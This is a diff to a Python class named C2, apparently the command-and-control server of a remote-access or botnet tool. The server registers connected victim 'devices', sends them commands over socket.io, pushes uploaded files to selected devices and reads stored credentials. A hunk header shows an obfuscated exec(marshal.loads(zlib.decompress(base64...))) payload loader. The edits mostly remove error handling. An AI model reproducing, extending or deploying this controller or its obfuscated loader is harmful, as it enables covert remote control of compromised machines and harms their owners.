@@ -98,9 +98,6 @@ class C2:
         print(f"New device connected with sid {sid}")
 
         environ = self.sio.get_environ(sid)
-        if not environ:
-            print("Error: Could not retrieve environment details for this connection")
-            return
 
         client_ip = self.get_client_ip(environ)
 
@@ -157,23 +154,15 @@ class C2:
         return self.devices
 
     def delete_device(self, device_id):
-        try:
-            self.total_devices.pop(device_id)
-            if device_id in self.devices:
-                self.devices.pop(device_id)
-                self.sio.emit("delete", {'uid': device_id})
-                self.update_json()
-                return (True, "")
-        except Exception as err:
+        self.total_devices.pop(device_id)
+        if device_id in self.devices:
+            self.devices.pop(device_id)
+            self.sio.emit("delete", {'uid': device_id})
             self.update_json()
-            return (False, err)
 
     def list_all_devices(self):
         self.update_json()
-        try:
-            return (True, self.total_devices)  # Success case
-        except Exception as err:
-            return (False, str(err))
+        return self.total_devices
 
     def send_command(self, sid, data):
         self.sio.emit("command", data)
@@ -364,9 +353,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         file = request.files["file"]
         uids = json.loads(request.form["uids"])
 
-        if file.filename == "":
-            return json.dumps({"error": "No selected file"}), 400
-
         if file:
             # Read the file and convert to base64
             file_content = file.read()
@@ -402,13 +388,10 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             f.close()
 
     def get_settings(self):
-        try:
-            with open("config.json", "r") as file:
-                credentials = json.load(file)
-                file.close()
-            return credentials
-        except FileNotFoundError:
-            return None
+        with open("config.json", "r") as file:
+            credentials = json.load(file)
+            file.close()
+        return credentials
 
     def screen_status(self, sid, data):
         print(data)
